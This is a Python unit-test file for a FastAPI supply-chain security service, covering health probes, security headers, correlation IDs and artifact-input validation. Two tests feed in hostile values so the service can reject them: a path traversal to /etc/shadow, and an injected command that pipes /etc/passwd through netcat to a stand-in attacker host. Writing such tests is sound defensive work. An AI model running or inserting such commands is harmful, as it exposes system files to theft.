"""Unit tests for the Enterprise Supply Chain Security FastAPI microservice."""

import re
import pytest
from fastapi.testclient import TestClient

from src.main import app

client = TestClient(app)


def test_root_endpoint():
    """Verify root endpoint returns operational status."""
    response = client.get("/")
    assert response.status_code == 200
    data = response.json()
    assert data["service"] == "enterprise-supply-chain-api"
    assert data["status"] == "operational"
    assert "documentation" in data


def test_healthz_liveness():
    """Verify Kubernetes liveness probe succeeds with uptime."""
    response = client.get("/healthz")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "healthy"
    assert "timestamp" in data
    assert data["uptime_seconds"] >= 0


def test_readyz_readiness():
    """Verify Kubernetes readiness probe succeeds with dependencies."""
    response = client.get("/readyz")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "ready"
    assert data["checks"]["internal_state"] == "ok"


def test_info_metadata_slsa_level():
    """Verify service information and SLSA Level 3 claims."""
    response = client.get("/api/v1/info")
    assert response.status_code == 200
    data = response.json()
    assert data["service"] == "enterprise-supply-chain-api"
    assert data["version"] == "1.0.0"
    assert data["slsa_build_level"] == "SLSA_BUILD_LEVEL_3"
    assert data["container_hardening"]["run_as_uid"] == 65532
    assert data["container_hardening"]["shell_present"] is False
    assert data["container_hardening"]["read_only_root_fs"] is True


def test_security_headers_enforced():
    """Verify OWASP recommended security headers are present on responses."""
    response = client.get("/healthz")
    assert response.status_code == 200

    headers = response.headers
    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") == "DENY"
    assert headers.get("X-XSS-Protection") == "1; mode=block"
    assert "default-src 'none'" in headers.get("Content-Security-Policy", "")
    assert "max-age=63072000" in headers.get("Strict-Transport-Security", "")
    assert headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"


def test_correlation_id_auto_generated():
    """Verify an X-Correlation-ID is automatically generated if omitted."""
    response = client.get("/healthz")
    assert response.status_code == 200
    corr_id = response.headers.get("X-Correlation-ID")
    assert corr_id is not None
    # Verify it matches standard UUID pattern
    uuid_pattern = r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"
    assert re.match(uuid_pattern, corr_id) is not None


def test_correlation_id_propagated():
    """Verify a client-provided X-Correlation-ID is preserved and echoed."""
    custom_id = "test-audit-corr-9988-aabb"
    response = client.get("/healthz", headers={"X-Correlation-ID": custom_id})
    assert response.status_code == 200
    assert response.headers.get("X-Correlation-ID") == custom_id


def test_verify_data_valid_payload():
    """Verify valid artifact integrity payload passes validation."""
    payload = {
        "artifact_name": "production-payment-service",
        "sha256_digest": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "environment": "production",
        "metadata": {"builder": "github-actions", "signed": "cosign"},
    }
    response = client.post("/api/v1/verify-data", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["verified"] is True
    assert data["artifact_name"] == "production-payment-service"
    assert data["sha256_digest"] == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    assert data["slsa_level"] == "SLSA_BUILD_LEVEL_3"


def test_verify_data_path_traversal_rejected():
    """Verify path traversal sequences in artifact_name are rejected by validator."""
    payload = {
        "artifact_name": "../../etc/shadow",
        "sha256_digest": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "environment": "production",
    }
    response = client.post("/api/v1/verify-data", json=payload)
    assert response.status_code == 422


def test_verify_data_command_injection_rejected():
    """Verify shell injection meta-characters are rejected."""
    payload = {
        "artifact_name": "app; cat /etc/passwd | nc evil.com 4444",
        "sha256_digest": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "environment": "production",
    }
    response = client.post("/api/v1/verify-data", json=payload)
    assert response.status_code == 422


def test_verify_data_invalid_hash_rejected():
    """Verify invalid SHA256 length and non-hex characters are rejected."""
    # Too short
    payload_short = {
        "artifact_name": "my-service",
        "sha256_digest": "abcd1234not64chars",
        "environment": "production",
    }
    response = client.post("/api/v1/verify-data", json=payload_short)
    assert response.status_code == 422

    # Non-hex characters
    payload_non_hex = {
        "artifact_name": "my-service",
        "sha256_digest": "g" * 64,
        "environment": "production",
    }
    response_non_hex = client.post("/api/v1/verify-data", json=payload_non_hex)
    assert response_non_hex.status_code == 422
